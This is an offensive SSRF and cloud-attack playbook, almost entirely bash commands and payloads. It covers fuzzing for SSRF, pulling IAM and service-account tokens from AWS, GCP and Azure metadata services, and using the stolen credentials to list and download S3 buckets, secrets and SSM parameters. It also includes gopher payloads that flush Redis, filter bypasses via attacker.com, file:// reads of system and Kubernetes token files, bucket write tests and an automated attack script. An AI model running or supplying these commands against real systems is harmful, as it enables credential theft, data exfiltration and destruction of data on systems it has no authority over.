# DEVIL CLOUD & SSRF ANNIHILATION v777

## ══════════════════════════════════════
## SSRF — FULL EXPLOITATION PLAYBOOK
## ══════════════════════════════════════

### SSRF Discovery — Finding the Entry Point
```bash
TARGET="https://target.com"
COLLAB="https://YOUR.oast.me"  # interactsh or burp collab

# 1. Parameter fuzzing for SSRF
ffuf -u "$TARGET/api/fetch?url=FUZZ" \
  -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200,301,302,500

# 2. Common SSRF params
for param in url uri endpoint webhook callback dest redirect next source image proxy; do
  curl -s "$TARGET/api/data?${param}=${COLLAB}" &
done
wait

# 3. Headers that trigger SSRF
curl -s $TARGET -H "X-Forwarded-For: $COLLAB" \
  -H "X-Real-IP: $COLLAB" \
  -H "Referer: $COLLAB" \
  -H "Host: $COLLAB"
```

### AWS IMDSv1 — Full Exploitation Chain
```bash
# Step 1: Confirm SSRF to internal network
curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"

# Step 2: Get IAM role name
curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Step 3: Exfiltrate IAM credentials
ROLE="ecs-task-role"  # Replace with detected role
curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration

# Step 4: Configure stolen creds
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="secret..."
export AWS_SESSION_TOKEN="token..."

# Step 5: Enumerate permissions
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name $ROLE 2>/dev/null
aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/POLICY --version-id v1 2>/dev/null

# Step 6: Lateral movement
aws s3 ls                    # List all buckets
aws s3 ls s3://bucket-name   # List bucket contents
aws s3 cp s3://bucket/secrets/env.txt /tmp/  # Exfiltrate
aws secretsmanager list-secrets 2>/dev/null  # Secrets Manager
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption 2>/dev/null  # SSM params
aws lambda list-functions 2>/dev/null        # Lambda funcs
aws ec2 describe-instances 2>/dev/null       # EC2 instances
aws rds describe-db-instances 2>/dev/null    # RDS databases
```

### AWS IMDSv2 Bypass
```bash
# IMDSv2 requires PUT + token — but many SSRF libs support full HTTP
# Step 1: Get token
curl "https://target.com/api/fetch" \
  --data '{"url":"http://169.254.169.254/latest/api/token","method":"PUT","headers":{"X-aws-ec2-metadata-token-ttl-seconds":"21600"}}'
# Returns: TOKEN

# Step 2: Use token
curl "https://target.com/api/fetch" \
  --data '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","headers":{"X-aws-ec2-metadata-token":"TOKEN"}}'
```

### GCP Metadata Service
```bash
# Base URL
METADATA="http://metadata.google.internal/computeMetadata/v1/"

# Via SSRF:
curl "https://target.com/fetch?url=${METADATA}instance/service-accounts/default/token" \
  -H "X-Metadata-Flavor: Google" # Many SSRF endpoints don't forward custom headers — try both

# Full exfil:
curl "https://target.com/fetch?url=${METADATA}project/project-id&header=Metadata-Flavor:Google"
curl "https://target.com/fetch?url=${METADATA}instance/service-accounts/default/email&header=Metadata-Flavor:Google"
curl "https://target.com/fetch?url=${METADATA}instance/service-accounts/default/token&header=Metadata-Flavor:Google"
# Use token to call Google APIs:
curl -H "Authorization: Bearer TOKEN" https://www.googleapis.com/storage/v1/b?project=PROJECT_ID
```

### Azure IMDS
```bash
# Azure endpoint (no special header required)
curl "https://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01&header=Metadata:true"
curl "https://target.com/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com/&header=Metadata:true"
```

### SSRF Protocol Smuggling
```bash
# file:// — read local files
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
file:///var/run/secrets/kubernetes.io/serviceaccount/token  # K8s SA token

# dict:// — Redis/memcache commands
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats

# gopher:// — raw TCP (HTTP, Redis, SMTP)
# Redis via gopher:
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
# HTTP via gopher (attack internal services):
gopher://127.0.0.1:8080/_GET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a

# sftp://, ldap://, ftp://, tftp://
ftp://127.0.0.1:21/etc/passwd

# DNS rebinding bypass
# Register domain resolving to 169.254.169.254 → bypass whitelist checks
```

### SSRF Bypass Techniques
```bash
# IP obfuscation
http://0x7f000001/        # 127.0.0.1 hex
http://2130706433/        # 127.0.0.1 decimal
http://127.0.1/           # short form
http://127.000.000.001/   # padded zeros
http://①②⑦.⓪.⓪.①/    # unicode
http://[::1]/             # IPv6 localhost
http://[::ffff:127.0.0.1]/  # IPv6-mapped
http://localhost/
http://loopback/
http://localtest.me/      # DNS resolves to 127.0.0.1

# URL parsing confusion
http://attacker.com#@169.254.169.254/
http://169.254.169.254 @attacker.com/
http://attacker.com?@169.254.169.254/
http://169.254.169.254%00.attacker.com/

# Double URL encoding
http://169%252e254%252e169%252e254/
```

### Kubernetes Internal Service Discovery via SSRF
```bash
# K8s API server
curl "https://target.com/fetch?url=https://kubernetes.default.svc/api/v1/namespaces"
# With service account token:
curl "https://target.com/fetch?url=https://kubernetes.default.svc/api/v1/secrets" \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"

# Scan internal K8s services
for port in 2379 2380 6443 8080 8443 10250 10255; do
  curl -s "https://target.com/fetch?url=http://kubernetes.default.svc:$port/" 2>/dev/null | head -1
done
```

---

## ══════════════════════════════════════
## CLOUD BUCKET MISCONFIGS
## ══════════════════════════════════════

```bash
TARGET_DOMAIN="target.com"
COMPANY="target"

# S3 bucket naming patterns
for name in $COMPANY ${COMPANY}-backup ${COMPANY}-dev ${COMPANY}-staging \
            ${COMPANY}-prod ${COMPANY}-assets ${COMPANY}-uploads \
            ${COMPANY}-static ${COMPANY}-media ${COMPANY}-files \
            ${COMPANY}-logs ${COMPANY}-data ${COMPANY}-internal; do
  aws s3 ls s3://$name 2>/dev/null && echo "OPEN BUCKET: $name" &
  curl -s "https://${name}.s3.amazonaws.com/" | grep -q "ListBucketResult" && \
    echo "PUBLIC: $name" &
done
wait

# Enumerate bucket content
aws s3 ls s3://BUCKET_NAME --no-sign-request
aws s3 cp s3://BUCKET_NAME/secret.env /tmp/ --no-sign-request

# Check write access (ACL misconfiguration)
echo "test" | aws s3 cp - s3://BUCKET_NAME/roxx-test.txt --no-sign-request && \
  echo "WRITABLE BUCKET — CRITICAL"

# GCS buckets
for name in $COMPANY ${COMPANY}-backup ${COMPANY}-dev; do
  curl -s "https://storage.googleapis.com/$name" | grep -v "NoSuchBucket" && echo "GCS: $name"
done

# Azure blobs
for name in $COMPANY ${COMPANY}backup ${COMPANY}dev; do
  curl -s "https://${name}.blob.core.windows.net/" | grep -v "ResourceNotFound" && echo "Azure: $name"
done
```

---

## ══════════════════════════════════════
## AUTOMATED CLOUD ATTACK CHAIN
## ══════════════════════════════════════

```bash
#!/usr/bin/env bash
# Full SSRF→Cloud→Exfil chain
TARGET="$1"
OUT="/home/roxx/findings/cloud-$TARGET"
mkdir -p "$OUT"

echo "[*] Testing SSRF vectors..."
SSRF_PARAMS="url uri endpoint callback webhook dest redirect next source proxy image fetch"
for param in $SSRF_PARAMS; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" "$TARGET?${param}=http://169.254.169.254/latest/meta-data/" --max-time 5)
  [[ "$STATUS" == "200" ]] && echo "SSRF via $param!" | tee -a "$OUT/ssrf.txt"
done

echo "[*] Testing IMDSv1..."
IMDS=$(curl -s "$TARGET?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" --max-time 10)
[[ -n "$IMDS" ]] && echo "IAM ROLE: $IMDS" | tee -a "$OUT/creds.txt"
```

**IMPACT: Critical RCE/data exposure | Bounty: $10,000–$500,000**
